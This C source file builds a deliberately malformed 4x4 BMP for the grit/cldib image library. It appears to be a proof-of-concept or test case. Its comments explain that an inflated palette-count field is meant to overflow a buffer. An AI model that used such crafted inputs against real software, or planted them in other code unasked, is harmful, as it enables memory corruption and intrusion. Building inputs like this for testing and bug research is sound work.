#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

#include <cldib.h>
#include <grit.h>


#ifdef __APPLE__
# define SECRET_GLOBAL      __attribute__((section("__DATA,__secret")))
# define SECRET_GLOBAL_RO   __attribute__((section("__TEXT,__secret")))
#else
# define SECRET_GLOBAL      __attribute__((section(".data.secret")))
# define SECRET_GLOBAL_RO   __attribute__((section(".rodata.secret")))
#endif

BITMAPFILEHEADER bmp_file_header SECRET_GLOBAL = {
    .bfType = 0x4d42,
    .bfSize = 0x36 + 0x30,
    .bfReserved1 = 0,
    .bfReserved2 = 0,
    .bfOffBits = 0x36,
};

BITMAPINFOHEADER bmp_info_header SECRET_GLOBAL = {
    .biSize = sizeof(BITMAPINFOHEADER),
    .biWidth = 4,
    .biHeight = 4,
    .biPlanes = 1,
    .biBitCount = 24,
    .biCompression = BI_RGB,
    .biSizeImage = 0x30,
    .biXPelsPerMeter = 2835,
    .biYPelsPerMeter = 2835,
    // Should be zero, but we set this so that biClrUsed * 4 (sizeof(RGBQUAD))
    // exceeds the size of the image data, causing a buffer overflow.
    .biClrUsed = 0x10,
    .biClrImportant = 0,
};

const size_t IMAGE_DATA_LEN = 256;
uint8_t bmp_image_data[IMAGE_DATA_LEN] SECRET_GLOBAL = {
    // Doesn't matter - we care only about the length, which must be at least
    // 0x3c.
    0
};

